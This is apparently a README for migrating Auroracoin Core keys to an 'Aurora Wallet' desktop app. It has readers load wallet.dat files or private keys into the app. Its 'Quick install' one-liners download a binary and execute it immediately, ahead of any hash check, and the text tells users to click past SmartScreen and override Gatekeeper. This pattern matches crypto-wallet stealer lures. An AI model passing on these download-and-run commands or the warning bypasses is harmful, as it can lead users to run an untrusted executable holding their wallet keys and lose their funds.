![Aurora Wallet migrate from Auroracoin Core guide](assets/aurora-wallet-guide-article-banner.png)

# How to migrate from Auroracoin Core to Aurora Wallet

Take the keys out of the old full-node client and into the desktop wallet you run today.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Migration means one thing: the keys in the old client reach the new wallet, and the old client stops being the only copy.

Auroracoin Core was the full-node desktop client of the network, and it still holds the keys of anyone who used it. Aurora Wallet reads those keys directly, either from the wallet file or from an exported key, so the move does not require rebuilding the old installation on a modern machine.

<!-- ARTICLE-BODY-BEGIN -->

## Before you start

Open the old client one last time if it still runs on some machine, and confirm the balance you expect. Note the addresses holding the coins, because you will compare them after the import.

Copy the wallet file from the old data directory to an external drive. The folder depends on the operating system and matches the one in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">the wallet.dat location guide</a>.

## Move the keys in order

1. Install Aurora Wallet and let it sync.
2. Create the new wallet and write the recovery phrase on paper.
3. Copy the old wallet file to the new machine on external media.
4. Use the import option to read the copied file.
5. Enter the old password if the file was encrypted.
6. Confirm the expected addresses appear with their balances.
7. Keep the old file offline until a test payment confirms from the new wallet.

A test payment proves the keys work before you rely on the migration. Send a small amount out and back before you move a large balance.

## What changes and what does not

The addresses stay the same after an import, because the keys are the same. The recovery phrase belongs to the new wallet, and after the import it covers the imported keys as well, so one paper backup restores everything.

The old client's chain data is not migrated. Aurora Wallet downloads its own copy of the chain, which takes hours rather than days on an SSD, and the old folder can be removed once the new wallet shows the balance.

The <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> carries the import path that reads the file.

The step-by-step version of this procedure is <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat</a>, which also covers the password prompt on an encrypted file.

If the old client exported single keys instead of a file, <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md">sweeping WIF keys</a> is the route to use.

## FAQ

### Do I need to install Auroracoin Core on a new machine?

No. The wallet file is enough, and the modern wallet reads it directly.

### Will the old client still work after the migration?

It will, on the machine where it already runs. Keep it closed once the new wallet holds the keys, so the two copies never diverge.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
- [wallet.dat location](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md)
- [Legacy repositories explained](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md)
- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
